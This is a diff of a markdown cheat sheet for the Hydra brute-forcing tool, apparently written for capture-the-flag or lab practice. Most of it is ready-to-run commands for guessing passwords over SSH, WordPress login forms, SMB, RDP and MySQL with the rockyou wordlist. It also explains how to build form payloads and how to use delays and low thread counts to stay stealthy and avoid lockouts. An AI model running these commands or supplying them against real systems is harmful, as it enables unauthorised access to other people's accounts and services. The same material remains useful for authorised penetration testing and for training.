@@ -1,137 +1,114 @@
+# Hydra Cheat Sheet – Brute-Force Protocols
 
-Hydra has the ability to brute force the following protocols: **FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, MYSQL, POSTGRES, RDP, SIP, SMB, SMTP, SMTP Enum etc...**
-# Hydra Commands – Quick Summary
+## Supported Protocols
+FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY,  
+HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy,  
+MYSQL, POSTGRES, RDP, SIP, SMB, SMTP, SMTP-Enum, SSH, etc.
 
-Hydra is a brute-force tool that attacks login services (SSH, FTP, web forms, etc.) using usernames and password lists.  
+## General Summary
+Hydra is a brute-force tool for attacking login services (SSH, FTP, web forms, etc.) using usernames/passwords.  
+Syntax varies by protocol. Always test with small lists first to confirm.
 
-The command syntax changes depending on the protocol/service.
 ## General Syntax
 ```bash
-hydra [options] <target> <service>
+hydra [options] TARGET SERVICE
 ```
+Common options:
+- `-l user` / `-L file` → single username or list  
+- `-p pass` / `-P file` → single password or list  
+- `-V` → full verbose (shows every attempt)  
+- `-v` → basic status only  
+- `-I` → ignore restore file  
+- `-t N` → threads (4–16 for SSH, 32–64 for HTTP)  
+- `-w N` / `-W N` → wait N seconds between tries/after fail  
+- `-e nsr` → null, same-as-login, reversed  
+- `-u` → loop users first (faster)  
+- `-o found.txt` → save valid creds  
 
-# 1. SSH Brute-Force Example
-
+## 1. SSH Brute-Force Example
 ```bash
-hydra -l molly -P rockyou.txt 10.114.143.65 ssh -vV -t 4 -I -s <port_number>
-# -vV  : verbose
-# -I   : Skip restoring file
-# -t 4 : Reduce the tasks
-# -s   : port number
+hydra -l molly -P rockyou.txt 10.10.10.10 ssh -V -I -t 8 -w 5 -W 10 -e nsr -u -s PORT
 ```
 
 **Flags explained**:
-- `-l <username>` → single username (e.g., root, admin)
-- `-P <wordlist>` → path to password list file
-- `-t 4` → number of parallel threads (4 = moderate speed, avoids lockouts)
-- `ssh` → target service (SSH in this case)
+- `-l <user>` → single username  
+- `-P <wordlist>` → password list  
+- `-V` → full verbose (every attempt)  
+- `-I` → skip restore  
+- `-t 8` → 8 threads (safe max for SSH, avoids lockouts)  
+- `-w 5` / `-W 10` → delays to stay stealthy  
+- `-e nsr` → extra quick checks  
+- `-u` → users first (faster)  
+- `-s PORT` → custom port (if not 22)  
 
-**What it does**:
-- Tries username `root`
-- Tests every password from `passwords.txt`
-- Runs 4 attempts at the same time
+**What it does**:  
+- Tests every password for molly  
+- 8 parallel attempts  
+- Stops on first valid  
 
-# 2. Web Form (POST) Brute-Force Example
+**Noise tip**: SSH is slow — max ~10–30 tries/sec. Use -t 4 if blocked.
+
+## 2. Web Form (POST) Brute-Force Example (WordPress Login)
 ```bash
-hydra -l admin -P rockyou.txt 10.114.143.65 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -l elliot -P rockyou.txt 10.10.10.10 http-post-form \
+      "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" \
+      -V -I -t 32
 ```
 
 **Flags explained**:
-- `-l <username>` → single username to test
-- `-P <wordlist>` → password list file
-- `http-post-form` → module for POST-based web login forms
-- `"<path>:<login_credentials>:<invalid_response>"` → the important part (see below)
-  - `<path>` → login page URL (e.g. `/`, `/login.php`, `/admin/index.php`)
-  - `<login_credentials>` → the POST data fields with placeholders
-  - `<invalid_response>` → string that appears on failed login (e.g., `F=incorrect`, `Login failed`, `Invalid credentials`)
-- `-V` → verbose output (shows every attempt)
+- `-l <user>` → single username  
+- `-P <wordlist>` → password list  
+- `http-post-form` → POST form module  
+- `"<path>:<POST data>:<failure string>"` → core format (see below)  
+- `-V` → full verbose  
+- `-I` → skip restore  
+- `-t 32` → 32 threads (fast for HTTP)  
 
-### **Examples from real forms**:
+**Format explained**:
+- `<path>` → login URL (e.g., /wp-login.php)  
+- `<POST data>` → exact form fields with placeholders  
+  - `log` = username field  
+  - `pwd` = password field  
+  - `wp-submit=Log+In` = submit button (required, + = space)  
+  - ^USER^ / ^PASS^ = replaced during attack  
+- `<failure string>` → substring in failed response (e.g., :ERROR, :incorrect)  
 
-#### 1. **If the HTML looks like this**:
+**What it does**:  
+- Sends POST to login page  
+- If response contains "ERROR" → failure → continues  
+- Stops on valid login  
 
-```  html
-<input name="user" type="text">
-<input name="pass" type="password">
-```
+**Common WP failure strings**:  
+- `:ERROR`  
+- `:incorrect`  
+- `:The password you entered`  
+- `:Invalid username`  
 
-→ You **must** use:
-
-``` shell
-user=^USER^&pass=^PASS^    
-```
-
-**What it does**:
-- Sends POST requests to the login page
-- Replaces `^USER^` with the username (from `-l`)
-- Replaces `^PASS^` with each password from the wordlist
-- If the response **contains** the failure string (`F=incorrect`), Hydra marks it as wrong and continues
-### Other example : 
-```sh
-hydra -l admin
-      -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
-      10.114.143.65 http-post-form \
-      "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." \
-      -V
-```
-#### 2. **What about the <invalid_response> ?**
-
-Hydra searches the entire response body (the full HTML/text returned by the server after submitting the form) for the exact string you specified after the last colon (e.g., F=incorrect, Invalid credentials, Login failed, etc.).
-
----
->[!IMPORTANT]
->  **the submit=Login part is often needed, and it's **not** an error indicator.**
-
-### What submit=Login means
-
-Many login forms include a **hidden or visible submit button** with a name/value pair sent in the POST data.
-
-Example real HTML from a form:
-
-```html
-<input type="text" name="username">
-<input type="password" name="password">
-<input type="submit" name=submit value="Login"> #The name is the important one
-```
-
-When you click "Login", the browser sends:
-
-```txt
-username=admin&password=123&submit=Login
-```
-
-Hydra must **exactly replicate** what the browser sends, so you **include** the submit field:
-
-```txt
-username=^USER^&password=^PASS^&submit=Login
-```
-
-- If you **omit** <u>submit=Login</u>, the server might:
-    - Reject the request (no submit button pressed)
-    - Return a different page/error
-    - Or even treat it as success/failure incorrectly
-
-So **yes, add it** if it's present in the real POST request (check Network tab in browser dev tools).
-
-### Where does the "error" go then?
-
-The **error/failure indicator** goes **after the last colon :**, **not** inside the POST data.
-
-<u>Correct full format</u>:
-
-```sh
-"<path>:<full POST data with ^USER^ ^PASS^ and submit>:<failure string>"
-```
-
-<u>Examples</u>:
-
-1. With submit button:
-  ```sh
-  "/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid credentials"
+## Other Examples
+- **Null session SMB**:
+  ```bash
+  hydra -l '' -p '' 10.10.10.10 smb -s 445 -V
   ```
-  
-2. Without submit (if form doesn't send it):
-```sh
-"/login.php:username=^USER^&password=^PASS^:Invalid credentials"
-```
+
+- **RDP**:
+  ```bash
+  hydra -l admin -P rockyou.txt 10.10.10.10 rdp -V -t 1
+  ```
+
+- **MySQL**:
+  ```bash
+  hydra -l root -P rockyou.txt 10.10.10.10 mysql -V -I
+  ```
+
+## Troubleshooting Common Errors
+
+- **[ERROR] Unknown service** → Wrong service name (e.g., use `smb` not `samba`)  
+- **[ERROR] variables need ^USER^ / ^PASS^** → Add them in POST data  
+- **[WARNING] Restorefile** → Add `-I`  
+- **False positives** → Wrong failure string (test with known wrong creds)  
+- **Stuck / slow** → Reduce `-t`, add `-w 5 -W 10`  
+
+**Noise tip**: High threads = high noise. Use -t 1–4 for stealth.
+
+**Bottom line**: Always check form HTML/Network tab for POST data/failure string. Test with tiny lists.
 
